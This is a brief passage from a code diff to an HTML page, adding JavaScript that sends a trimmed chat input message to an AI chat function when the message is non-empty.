+                        const message = chatInput.value.trim();
+                        if (message) {
+                            sendAIChatMessage(message);
+                        }
+                    }
+                });
+            }
         });
     </script>
 </body>
-
 </html>
